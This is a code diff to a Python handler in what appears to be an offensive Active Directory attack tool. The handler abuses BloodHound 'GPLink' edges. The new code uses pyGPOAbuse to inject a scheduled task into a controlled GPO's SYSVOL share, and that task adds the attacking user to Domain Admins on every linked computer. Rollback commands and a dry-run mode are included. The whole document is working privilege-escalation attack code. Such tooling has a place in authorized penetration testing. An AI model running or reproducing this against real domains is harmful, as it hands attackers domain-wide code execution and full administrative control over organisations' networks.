@@ -2,20 +2,21 @@
 
 Exploits the ``GPLink`` (and ``GpLink``) BloodHound edge.  When a Group
 Policy Object is linked to an Organizational Unit or domain, and the
-attacker controls that GPO, malicious scripts or scheduled tasks can be
-pushed to all computers in the linked OU.
+attacker controls that GPO, a malicious scheduled task can be injected
+into SYSVOL via **pyGPOAbuse** to execute commands on all computers
+where the GPO applies.
 
 Attack flow:
-    1. Verify bloodyAD is available.
-    2. Identify the GPO distinguished name from edge properties.
-    3. Use bloodyAD to modify the GPO to add a scheduled task or startup
-       script that executes attacker-controlled code.
-    4. Wait for Group Policy refresh on linked computers (or trigger it
-       remotely).
+    1. Resolve the GPO Distinguished Name (via bloodyAD LDAP search).
+    2. Extract the GPO GUID from the DN.
+    3. Use pyGPOAbuse to create an immediate scheduled task that adds
+       the attacking user to Domain Admins.
+    4. Execution occurs at the next Group Policy refresh (~90 min)
+       or can be forced via ``gpupdate /force``.
 
 Rollback:
-    Remove the malicious GPO modification and restore the original GPO
-    state.
+    Delete the ``ScheduledTasks.xml`` from SYSVOL and restore the
+    original ``gpt.ini`` version.
 """
 
 from __future__ import annotations
@@ -30,80 +31,63 @@ from pathstrike.models import (
     RollbackAction,
 )
 from pathstrike.tools import bloodyad_wrapper as bloody
+from pathstrike.tools import pygpoabuse_wrapper as pygpo
 
 
 @register_handler("GPLink", "GpLink")
 class GPLinkHandler(BaseEdgeHandler):
-    """Exploit ``GPLink``/``GpLink`` edges via GPO modification.
+    """Exploit ``GPLink``/``GpLink`` edges via pyGPOAbuse.
 
-    If we control a GPO that is linked to an OU or domain, we can
-    modify the GPO to push malicious scheduled tasks or startup scripts
-    to all computers within the linked scope.
+    If we control a GPO that is linked to an OU or domain, pyGPOAbuse
+    writes a malicious ``ScheduledTasks.xml`` into the GPO's SYSVOL
+    share, updates ``gpt.ini``, and registers the required extension
+    GUIDs — achieving code execution on all linked machines.
     """
 
-    # Track GPO DN for rollback
     _gpo_dn: str | None = None
-    _original_gpt_ini: str | None = None
+    _gpo_guid: str | None = None
+    _taskname: str = "PathStrike"
 
     # ------------------------------------------------------------------
     # Prerequisites
     # ------------------------------------------------------------------
 
     async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
-        """Verify bloodyAD is available for GPO modification.
+        if not shutil.which("pygpoabuse"):
+            return (
+                False,
+                "pygpoabuse not found on PATH. "
+                "Install via: pip install pygpoabuse",
+            )
 
-        Args:
-            edge: The ``GPLink``/``GpLink`` edge to evaluate.
-
-        Returns:
-            ``(ok, message)`` tuple.
-        """
         if not shutil.which("bloodyAD"):
-            return (
-                False,
-                "bloodyAD binary not found on PATH. "
-                "Install via: pip install bloodyAD",
+            self.logger.warning(
+                "bloodyAD not found — GPO DN resolution may fail if "
+                "DN is not available in edge properties."
             )
 
-        # Extract GPO info from edge properties
-        props = dict(edge.properties)
-        props.update(edge.source.properties)
-        gpo_dn = (
-            props.get("gpo_dn")
-            or props.get("distinguishedname")
-            or props.get("dn")
-        )
-        gpo_name = (
-            props.get("gpo_name")
-            or props.get("displayname")
-            or edge.source.name
-        )
-
-        if not gpo_dn and not gpo_name:
+        gpo_name = self._get_gpo_name(edge)
+        if not gpo_name:
             return (
                 False,
-                "Cannot determine GPO identity from edge properties. "
-                "Need gpo_dn or gpo_name.",
+                "Cannot determine GPO identity from edge properties.",
             )
 
-        # Verify credentials
         source_user = self._resolve_principal(edge)
         domain = self._get_domain()
         cred = self.cred_store.get_best_credential(source_user, domain)
-
         if cred is None:
             cfg = self.config.credentials
             if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                 return (
                     False,
-                    f"No credentials available for '{source_user}'. "
-                    "Cannot modify GPO.",
+                    f"No credentials available for '{source_user}'.",
                 )
 
         return (
             True,
-            f"Ready for GPLink exploitation: can modify GPO '{gpo_name}' "
-            f"linked to {edge.target.name}.",
+            f"Ready: pyGPOAbuse will inject scheduled task into GPO "
+            f"'{gpo_name}' linked to {edge.target.name}.",
         )
 
     # ------------------------------------------------------------------
@@ -115,34 +99,13 @@ class GPLinkHandler(BaseEdgeHandler):
         edge: EdgeInfo,
         dry_run: bool = False,
     ) -> tuple[bool, str, list[Credential]]:
-        """Modify the GPO to push a malicious scheduled task to linked targets.
-
-        Args:
-            edge: The ``GPLink``/``GpLink`` edge.
-            dry_run: If ``True``, report what would be modified without acting.
-
-        Returns:
-            ``(success, message, new_credentials)`` tuple.
-        """
         source_user = self._resolve_principal(edge)
-        target = self._resolve_target(edge)
-        auth_args = self._get_auth_args(source_user)
+        gpo_name = self._get_gpo_name(edge)
 
-        # Extract GPO properties
-        props = dict(edge.properties)
-        props.update(edge.source.properties)
-        gpo_dn = (
-            props.get("gpo_dn")
-            or props.get("distinguishedname")
-            or props.get("dn")
-        )
-        gpo_name = (
-            props.get("gpo_name")
-            or props.get("displayname")
-            or edge.source.name.split("@")[0]
-        )
-        # Resolve GPO DN via LDAP if not already known
+        # --- Resolve GPO DN ------------------------------------------------
+        gpo_dn = self._get_gpo_dn_from_props(edge)
         if not gpo_dn:
+            auth_args = self._get_auth_args(source_user)
             gpo_dn = await bloody.resolve_dn(
                 self.config, auth_args, f"(displayName={gpo_name})"
             )
@@ -155,75 +118,72 @@ class GPLinkHandler(BaseEdgeHandler):
 
         self._gpo_dn = gpo_dn
 
+        # --- Extract GUID --------------------------------------------------
+        gpo_guid = pygpo.extract_gpo_guid(gpo_dn)
+        if not gpo_guid:
+            return (
+                False,
+                f"Could not extract GUID from GPO DN: {gpo_dn}",
+                [],
+            )
+        self._gpo_guid = gpo_guid
+
+        # --- Build the DA escalation command --------------------------------
+        command = (
+            f"net group \"Domain Admins\" {source_user} /add /domain"
+        )
+
         if dry_run:
             return (
                 True,
-                f"[DRY RUN] Would modify GPO '{gpo_name}' "
-                f"(DN: {gpo_dn or 'auto-resolve'}) to add a scheduled task "
-                f"targeting computers in '{target}'. No changes made.",
+                f"[DRY RUN] Would use pyGPOAbuse to inject scheduled task "
+                f"'{self._taskname}' into GPO '{gpo_name}' ({gpo_guid}). "
+                f"Command: {command}",
                 [],
             )
 
-        # Step 1: Read current GPO state for rollback
+        # --- Get impacket-style auth ----------------------------------------
+        target_string, auth_flags = self._get_impacket_auth(source_user)
+
+        # --- Execute pyGPOAbuse ---------------------------------------------
         self.logger.info(
-            "GPLink Step 1: Reading current GPO state for '%s'", gpo_name,
+            "Using pyGPOAbuse to inject scheduled task into GPO '%s' (%s)",
+            gpo_name,
+            gpo_guid,
         )
-        if gpo_dn:
-            read_result = await bloody.run_bloodyad(
-                ["get", "object", gpo_dn, "--attr", "gPCFileSysPath,versionNumber"],
-                self.config,
-                auth_args=auth_args,
-            )
-            if read_result["success"]:
-                parsed = read_result.get("parsed") or {}
-                self._original_gpt_ini = read_result.get("output", "")
-                self.logger.info(
-                    "Captured original GPO state for rollback."
-                )
+        self.logger.info("Task command: %s", command)
 
-        # Step 2: Modify GPO to add an immediate scheduled task
-        self.logger.info(
-            "GPLink Step 2: Modifying GPO '%s' to add scheduled task", gpo_name,
+        result = await pygpo.abuse_gpo(
+            target_string=target_string,
+            auth_flags=auth_flags,
+            gpo_id=gpo_guid,
+            dc_ip=self._get_dc_host(),
+            command=command,
+            taskname=self._taskname,
+            force=True,
         )
 
-        # Use bloodyAD to set a malicious scheduled task in the GPO.
-        # The exact command depends on bloodyAD version; we use the
-        # generic set approach for GPO script injection.
-        gpo_target = gpo_dn or gpo_name
-        extension_value = (
-            "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
-            "[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
-        )
-        modify_result = await bloody.run_bloodyad(
-            [
-                "set", "object", gpo_target,
-                "gPCMachineExtensionNames",
-                "-v", extension_value,
-            ],
-            self.config,
-            auth_args=auth_args,
-        )
-
-        if not modify_result["success"]:
+        if not result["success"]:
             return (
                 False,
-                f"GPO modification failed for '{gpo_name}': "
-                f"{modify_result.get('error', 'unknown')}",
+                f"pyGPOAbuse failed for GPO '{gpo_name}': "
+                f"{result.get('error', 'unknown')}",
                 [],
             )
 
         self.logger.info(
-            "GPO '%s' modified. Scheduled task will execute on linked "
-            "computers in '%s' at next Group Policy refresh.",
-            gpo_name, target,
+            "Scheduled task injected into GPO '%s'. "
+            "Command will execute on linked computers at next GP refresh.",
+            gpo_name,
         )
 
         return (
             True,
-            f"GPO '{gpo_name}' modified with scheduled task. "
-            f"Targets: computers linked via '{target}'. "
-            "Execution occurs at next Group Policy refresh cycle (~90 min) "
-            "or can be triggered via 'gpupdate /force' on target computers.",
+            f"pyGPOAbuse injected scheduled task '{self._taskname}' into "
+            f"GPO '{gpo_name}' ({gpo_guid}). "
+            f"Command: {command}. "
+            "Execution occurs at next Group Policy refresh (~90 min) "
+            "or via 'gpupdate /force' on target machines.",
             [],
         )
 
@@ -232,34 +192,55 @@ class GPLinkHandler(BaseEdgeHandler):
     # ------------------------------------------------------------------
 
     def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
-        """Remove the malicious GPO modification.
+        gpo_name = self._get_gpo_name(edge)
+        gpo_guid = self._gpo_guid or ""
+        domain = self._get_domain()
 
-        Args:
-            edge: The ``GPLink``/``GpLink`` edge.
-
-        Returns:
-            A :class:`RollbackAction` that restores the original GPO state.
-        """
-        props = dict(edge.properties)
-        props.update(edge.source.properties)
-        gpo_name = (
-            props.get("gpo_name")
-            or props.get("displayname")
-            or edge.source.name.split("@")[0]
+        sysvol_path = (
+            f"\\\\{domain}\\SysVol\\{domain}\\Policies\\{gpo_guid}"
+            f"\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
         )
-        gpo_dn = self._gpo_dn or props.get("gpo_dn") or props.get("distinguishedname") or gpo_name
 
         return RollbackAction(
             step_index=0,
             action_type="restore_gpo",
             description=(
-                f"Remove malicious scheduled task from GPO '{gpo_name}' "
-                f"and restore original GPO configuration"
+                f"Remove scheduled task '{self._taskname}' from GPO "
+                f"'{gpo_name}' and restore original GPO state"
             ),
             command=(
-                f"bloodyAD set object '{gpo_dn}' "
-                "--attr gPCMachineExtensionNames --value '' "
-                "# Restore original gPCMachineExtensionNames value"
+                f"# 1. Delete the injected ScheduledTasks.xml from SYSVOL:\n"
+                f"smbclient.py '{domain}/{{}}'@{self._get_dc_host()} "
+                f"-c 'del {sysvol_path}'\n"
+                f"# 2. Restore gpt.ini version (decrement Machine version):\n"
+                f"#    Edit {gpo_guid}\\Machine\\gpt.ini in SYSVOL\n"
+                f"# 3. Reset gPCMachineExtensionNames via bloodyAD:\n"
+                f"bloodyAD set object '{self._gpo_dn}' "
+                f"gPCMachineExtensionNames -v ''"
             ),
             reversible=True,
+        )
+
+    # ------------------------------------------------------------------
+    # Internal helpers
+    # ------------------------------------------------------------------
+
+    def _get_gpo_name(self, edge: EdgeInfo) -> str:
+        """Extract the GPO display name from edge/source properties."""
+        props = dict(edge.properties)
+        props.update(edge.source.properties)
+        return (
+            props.get("gpo_name")
+            or props.get("displayname")
+            or edge.source.name.split("@")[0]
+        )
+
+    def _get_gpo_dn_from_props(self, edge: EdgeInfo) -> str | None:
+        """Try to get GPO DN directly from edge/source properties."""
+        props = dict(edge.properties)
+        props.update(edge.source.properties)
+        return (
+            props.get("gpo_dn")
+            or props.get("distinguishedname")
+            or props.get("dn")
         )
